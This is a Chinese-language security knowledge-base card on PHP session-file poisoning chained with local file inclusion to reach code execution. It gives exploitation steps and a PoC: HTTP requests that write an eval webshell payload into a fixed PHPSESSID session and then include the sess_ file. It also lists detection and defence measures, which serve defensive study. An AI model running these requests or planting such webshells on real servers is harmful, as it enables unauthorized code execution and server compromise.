---
id: web-php-file-inclusion-session-poisoning-sess-file
title: PHP Session 文件包含：应用把 POST 参数写入 $_SESSION 后 LFI 包含 sess_<PHPSESSID> 执行代码
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-session-poisoning-sess-file-inclusion
tags:
- php
- file-inclusion
- session
- lfi
- rce
- webshell
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-07'
updated: '2026-11-07'
url: /docs/web/php/file-inclusion/web-php-file-inclusion-session-poisoning-sess-file/
draft: false
kb_aliases:
- Session 文件包含
- session 投毒
- sess_PHPSESSID
- $_SESSION 写马
- PHP session 包含 getshell
- 会话文件包含
---

## 一句话结论

PHP 应用调用 `session_start()` 后把用户可控的 POST 参数写入 `$_SESSION`，同一页面又用 `include $_GET['file']` 包含用户指定路径时，攻击者可以固定 `PHPSESSID`、把 PHP 代码写进 Session，再让 `file` 指向 `sess_<PHPSESSID>`，由 LFI 包含该会话文件执行代码。

## 原理

- PHP 默认把 Session 序列化后写入 `session.save_path` 下的 `sess_<PHPSESSID>` 文件，内容形如 `username|s:28:"<?php ... ?>";`。Session 文件本身没有 `.php` 后缀，Web 服务器不会直接解析它，但只要应用用 `include`/`require` 把它当 PHP 文件载入，文件中的 `<?php ... ?>` 就会被 PHP 解析器执行；序列化前缀只是普通文本输出。
- 触发链需要两个条件同时存在：一是应用把用户输入（用户名、昵称、留言、搜索词等）写进 `$_SESSION`；二是存在用户可控的 `include` 路径（`?file=`、`?page=` 等）。
- 攻击者先通过 LFI 读取源码（如 `php://filter/convert.base64-encode/resource=action.php`）确认 Session 写入点、Session 文件路径与 include 参数，再发起带固定 `PHPSESSID` 的请求写入 payload，最后请求 `?file=<session 文件路径>`。
- Session 文件路径由 `session.save_path` 决定，常见为 `/var/lib/php/sessions/sess_<id>`、`/var/lib/php/sess_<id>`、`/tmp/sess_<id>`、`/tmp/sessions/sess_<id>`；也可通过 phpinfo、报错或源码确认。部分发行版/容器会使用不同目录，需要按目标调整。
- PHPSESSID 只允许字母数字等合法字符；payload 放在 Session 值里时不需要考虑文件名限制。若 Session 序列化会转义引号，仍可用不含引号的 PHP 代码或 `eval($_POST[...])` 形式。

## 触发条件

- PHP 应用使用 `session_start()`，且存在把 `$_POST`/`$_GET` 值写入 `$_SESSION` 的代码路径。
- 存在用户可控的文件包含点（`include $_GET['file']`、`?page=` 等），未做白名单或路径校验。
- 攻击者能设置 `PHPSESSID` Cookie，并知道/能推断 `session.save_path` 下的会话文件路径。
- Session 文件对 Web 进程可读、可被 include；`open_basedir` 未限制到会话目录之外。

## 利用步骤

1. 访问目标页面，观察 `file`/`page` 参数与 `PHPSESSID`；用 `php://filter/convert.base64-encode/resource=action.php` 读取源码，确认 `session_start()`、`$_SESSION[...] = $_POST[...]` 与 `include $_GET['file']`。
2. 选择一个合法 `PHPSESSID`（如 `attacker123`），在 Cookie 中固定它，避免后续请求换会话。
3. 向写入点 POST `name=<?php eval($_POST['cmd']);?>`（或 `<?php system($_GET['c']);?>`），使 payload 进入 Session 文件。
4. 依次尝试常见 Session 路径：`/var/lib/php/sessions/sess_attacker123`、`/var/lib/php/sess_attacker123`、`/tmp/sess_attacker123`、`/tmp/sessions/sess_attacker123`；通过 `?file=` 包含并观察是否执行。
5. 用 `cmd`/`c` 参数执行命令、读取 flag 或写入 WebShell；授权测试中使用无害命令并在结束后清理 Session 文件。
6. 若 `file` 参数被追加 `.php` 后缀或过滤，可结合 `php://filter`、`zip://`、路径截断等已有 LFI 技巧调整。

## PoC

```http
GET /index.php?file=php://filter/convert.base64-encode/resource=action.php HTTP/1.1
Host: target
```

```http
POST /index.php HTTP/1.1
Host: target
Cookie: PHPSESSID=attacker123
Content-Type: application/x-www-form-urlencoded

name=<?php eval($_POST['cmd']);?>
```

```http
GET /index.php?file=/var/lib/php/sessions/sess_attacker123 HTTP/1.1
Host: target
Cookie: PHPSESSID=attacker123
```

随后向同一页面 POST `cmd=system('id');`（payload 中的 `eval($_POST['cmd'])` 会执行）。原文通过该方式包含会话文件并执行命令读取 flag；具体 Session 路径按目标环境调整。

## 变体与关联

- 变体：没有可写 Session 字段时，用 `session.upload_progress` 的 `PHP_SESSION_UPLOAD_PROGRESS` 字段把 payload 写入 Session，再用 LFI 包含 `sess_<id>`。
- 变体：通过 `.user.ini` 把 `session.save_path` 改到 Web 目录并配合 `auto_prepend_file`，见 [[web-php-file-inclusion-user-ini-session-save-path-webshell]]。
- 变体：把 payload 写进访问日志/错误日志再用 LFI 包含，见 [[web-php-file-inclusion-access-log-poisoning-webshell]]、[[web-php-file-inclusion-php-error-log-poisoning-webshell]]。
- 关联：[[web-php-file-inclusion-data-wrapper-short-tag-rce]]（LFI 直接执行内联 PHP）、[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（通用路径穿越读取）；本卡的核心是“Session 文件作为可包含的 payload 载体”。
- 边界：应用只读 Session 不写入用户输入、Session 文件路径不可达/不可包含、`open_basedir` 限制会话目录、`session.save_path` 使用不可预测目录或 Session 数据被严格序列化校验时，该链不成立。

## 检测与防御

- 检测：请求中出现 `sess_` 路径、`php://filter` 读 `action.php`/`index.php` 等源码；短时间内同一 `PHPSESSID` 先写入含 `<?php` 的值再请求包含；Web 进程读取 Session 目录中的文件；日志中出现 `include` 报错指向会话文件。
- 防御：不要对用户可控路径直接 `include`，使用白名单映射；Session 文件放在 Web 根之外且不被 include；对 Session 中的用户输入做类型/内容校验；设置 `open_basedir` 限制可包含目录；关闭 `allow_url_include`；使用 `session.use_strict_mode` 并定期清理会话。
- 加固：代码审计时搜索 `session_start` 附近的 `$_SESSION[...] = $_POST`/`$_GET` 赋值，以及所有 `include $_GET`/`require $_REQUEST` 调用，二者同时出现即视为 Session 文件包含风险。
